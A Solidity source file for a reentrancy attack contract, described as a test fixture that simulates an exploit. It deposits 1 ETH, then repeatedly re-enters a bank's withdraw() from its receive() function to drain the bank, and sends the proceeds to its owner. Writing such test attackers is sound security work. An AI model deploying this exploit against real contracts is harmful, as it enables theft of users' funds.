// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

/**
 * @title ReentrancyAttacker
 * @notice Attack contract used in tests — simulates a real exploit
 * @dev Deposits 1 ETH, calls withdraw(), then re-enters via receive()
 *      until the victim bank is drained.
 */
contract ReentrancyAttacker {
    IBank public immutable bank;
    address public immutable owner;

    constructor(address _bank) {
        bank = IBank(_bank);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // Re-enters withdraw() on every ETH received while bank still has funds
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function collectFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}